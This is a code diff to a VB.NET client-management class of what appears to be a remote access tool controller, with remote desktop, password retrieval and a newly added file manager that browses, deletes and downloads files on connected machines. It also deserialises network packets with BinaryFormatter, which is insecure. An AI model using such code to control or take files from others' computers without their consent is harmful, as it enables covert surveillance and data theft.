@@ -14,13 +14,14 @@ Public Class Clients
     Public Property Local_Port As Integer
     Public Property Main_Form As New Client_Form(Me)
     Public Property Viewer As New RD_Form(Me)
-
     Public Property Connected As Boolean
-
     Public WithEvents AeroLI_MainForm As AeroListView
+    Public Property Details As IPAPI.IP
+    Public Property AddedHandler = False
 
     Sub New(ByRef LI As AeroListView)
         AeroLI_MainForm = LI
+
     End Sub
 
     Public Async Sub SetPW(ByVal Data As Object())
@@ -135,7 +136,7 @@ Public Class Clients
                                    ImageList.Images.Add(x, B)
 
                                Catch ex As Exception
-                                   Dim B As Bitmap = My.Resources.imageres_15.ToBitmap
+                                   Dim B As Bitmap = My.Resources.imageres_151.ToBitmap
                                    ImageList.Images.Add(x, B)
                                End Try
 
@@ -194,7 +195,11 @@ Public Class Clients
 
     Public Sub Sender(P As PacketLib.Packet.PacketMaker)
         Dim B As New BinaryFormatter
-        Task.Run(Sub() B.Serialize(Me.C.GetStream, P))
+        Task.Run(Sub()
+                     SyncLock C
+                         B.Serialize(Me.C.GetStream, P)
+                     End SyncLock
+                 End Sub)
     End Sub
 
     Public Sub SetPriv(ByVal N As Native.NtDll.NTSTATUS, ByVal P As Native.NtDll.Enumerations._PRIVILEGES)
@@ -241,7 +246,9 @@ Public Class Clients
                     Select Case packet.Type_Packet
 
                         Case PacketType.ID
-                            Await Task.Run(Sub() Countries.GetFlags(Me.C.Client.RemoteEndPoint.ToString, IMG, AeroLI_MainForm, packet.Misc, Port))
+                            Await Task.Run(Sub() Countries.GetFlags(Me.C.Client.RemoteEndPoint.ToString, IMG, AeroLI_MainForm, packet.Misc, Port, Details))
+
+
                           '  Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))
                      '   GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, packet.Misc, Port)
                         Case PacketType.PW
@@ -314,6 +321,7 @@ Public Class Clients
 
                                     T.Start()
 
+
                                 Case Packet_Subject.SET_PRIO
 
                                     Dim ResN As Native.NtDll.NTSTATUS = CType(packet.Misc(1), Native.NtDll.NTSTATUS)
@@ -343,6 +351,52 @@ Public Class Clients
 
                             End Select
 
+                        Case PacketType.FM
+
+                            Dim Packet_Sub As Packet_Subject = CType(packet.Misc(0), Packet_Subject)
+
+                            Select Case Packet_Sub
+
+                                Case Packet_Subject.GET_DISK
+
+                                    Dim T As New Thread(Sub() Set_Disks(packet.Misc))
+
+                                    T.Start()
+
+                                Case Packet_Subject.GET_FORWARD_PATH
+
+                                    Dim T As New Thread(Sub() Set_FM(packet.Misc))
+
+                                    T.Start()
+
+
+                                Case Packet_Subject.PUT_BIN_FILE
+
+                                    Dim T As New Thread(Sub() Check_Op(packet.Misc, Packet_Sub))
+
+                                    T.Start()
+
+                                Case Packet_Subject.DEL_FILE
+
+                                    Dim T As New Thread(Sub() Check_Op(packet.Misc, Packet_Sub))
+
+                                    T.Start()
+
+                                Case Packet_Subject.DW_FILE
+
+                                    Dim T As New Thread(Sub() Set_DW_File(packet.Misc))
+
+                                    T.Start()
+
+                                Case Packet_Subject.MK_DIR
+
+                                    Dim T As New Thread(Sub() Set_New_Dir(packet.Misc))
+
+                                    T.Start()
+
+                            End Select
+
+
                     End Select
 
                 Catch ex As Exception
@@ -356,8 +410,182 @@ Public Class Clients
         End Try
 
     End Sub
+    Public Async Sub Set_Disks(Data As Object())
+        Try
+
+            Dim Clear_CB As Task = Task.Run(Sub() Main_Form.Disk_ComboBox.Items.Clear())
+
+            Await Clear_CB
+
+            Dim Clear_LV As Task = Task.Run(Sub() Main_Form.FM_ListView.Items.Clear())
+
+            Await Clear_LV
+
+            Await Task.Run(Sub()
+
+                               For i = 1 To Data.Length - 1
+                                   Main_Form.Disk_ComboBox.Items.Add(Data(i).ToString())
+                               Next
+
+                           End Sub)
 
 
+            If AddedHandler = False Then
+                AddHandler Main_Form.Disk_ComboBox.SelectedIndexChanged, Sub() ComBoBoxHandler(Main_Form.Disk_ComboBox)
+                AddedHandler = True
+            End If
+
+            Main_Form.Disk_ComboBox.SelectedItem = Main_Form.Disk_ComboBox.Items(0)
+
+        Catch ex As Exception
+
+        End Try
+        GC.Collect()
+        GC.WaitForPendingFinalizers()
+        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
+    End Sub
+
+    Public Async Sub Set_FM(Data As Object())
+        Try
+
+            Dim Clear_LV As Task = Task.Run(Sub() Main_Form.FM_ListView.Items.Clear())
+
+            Await Clear_LV
+
+            Await Task.Run(Sub()
+
+                               Dim l_ As New Dictionary(Of File_Manager_Helper, List(Of Object()))
+
+                               l_ = Data(1)
+
+                               Dim ImageList = New ImageList()
+                               ImageList.ColorDepth = ColorDepth.Depth32Bit
+
+
+                               ImageList.ImageSize = New Size(32, 32)
+
+                               Main_Form.FM_ListView.LargeImageList = ImageList
+
+                               Dim x As Integer = 0
+
+                               For Each obj In l_
+
+
+                                   'MessageBox.Show(obj.Value(0).ToString())
+                                   If obj.Key = File_Manager_Helper.DIR Then
+
+                                       For Each obj_ In l_(File_Manager_Helper.DIR)
+
+                                           ImageList.Images.Add(x, My.Resources.folder)
+
+                                           Dim listViewItem = Main_Form.FM_ListView.Items.Add(obj_(0).ToString)
+                                           listViewItem.Tag = "FOLDER"
+                                           listViewItem.ImageKey = x
+                                       Next
+
+                                       x += 1
+
+
+
+                                   ElseIf obj.Key = File_Manager_Helper.FILE Then
+
+                                       For Each obj_ In l_(File_Manager_Helper.FILE)
+
+                                           Dim btm As Bitmap = Helpers.BytesToImage(obj_(1))
+
+                                           ImageList.Images.Add(x, btm)
+
+
+                                           Dim listViewItem = Main_Form.FM_ListView.Items.Add(obj_(0).ToString())
+                                           listViewItem.Tag = "FILE"
+                                           listViewItem.ImageKey = x
+
+                                           x += 1
+                                       Next
+
+
+
+                                   End If
+                               Next
+
+                           End Sub)
+
+        Catch ex As Exception
+
+        End Try
+        GC.Collect()
+        GC.WaitForPendingFinalizers()
+        NativeAPI.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+        NativeAPI.EmptyWorkingSet(Process.GetCurrentProcess().Handle)
+    End Sub
+    Public Sub Check_Op(Data As Object(), Op As Packet_Subject)
+        If Op = Packet_Subject.PUT_BIN_FILE Then
+            Select Case Data(1)
+                Case True
+                    MessageBox.Show($"Could not move {Data(2)} to bin !")
+                Case False
+                    'MessageBox.Show($"{Data(2)} has been moved to bin !")
+                    For Each Name As ListViewItem In Main_Form.FM_ListView.Items
+                        If Name.Text = Helpers.SplitPath(Data(2)) Then
+                            Name.Remove()
+                        End If
+                    Next
+            End Select
+        ElseIf Op = Packet_Subject.DEL_FILE Then
+
+            Select Case Data(1)
+                Case False
+                    MessageBox.Show($"Could not delete {Data(2)} to bin !")
+                Case True
+                    'MessageBox.Show($"{Data(2)} has been deleted !")
+                    For Each Name As ListViewItem In Main_Form.FM_ListView.Items
+                        If Name.Text = Helpers.SplitPath(Data(2)) Then
+                            Name.Remove()
+                        End If
+                    Next
+            End Select
+        End If
+    End Sub
+    Public Sub Set_DW_File(ByVal Data As Object())
+
+        Dim today = Date.Today
+        Dim day = today.Day
+        Dim month = today.Month
+        Dim Path As String = Application.StartupPath & "\Users\" & ID.Replace(":", "_") & day & month & "\Downloads"
+        Dim ext As String = Helpers.SplitPath(Data(1))
+
+        If Not IO.Directory.Exists(Path) Then
+            IO.Directory.CreateDirectory(Path)
+            IO.File.WriteAllBytes(Path & "\" & ext, Data(2))
+        Else
+            IO.File.WriteAllBytes(Path & "\" & ext, Data(2))
+        End If
+    End Sub
+    Public Sub Set_New_Dir(ByVal Data As Object())
+        If Data(2) = True Then
+            Dim S As String() = Split(Data(1), "\")
+
+            Dim L As New ListViewItem(S(S.Length - 1))
+            L.Tag = "FOLDER"
+            L.ImageKey = 0
+            Main_Form.FM_ListView.Items.Add(L)
+        Else
+            MessageBox.Show(Data(3).ToString())
+        End If
+    End Sub
+    Public Async Sub ComBoBoxHandler(ByVal l As ComboBox)
+
+        Dim P As New PacketMaker
+        P.Type_Packet = PacketType.PLUGIN
+        P.Plugin = Plugins._FM
+        P.Function_Params = New Object() {Packet_Subject.GET_FORWARD_PATH, l.Text}
+
+        Main_Form.Path_Lab.Text = l.Text
+
+        Await Task.Run(Sub() Sender(P))
+
+    End Sub
 
 
 
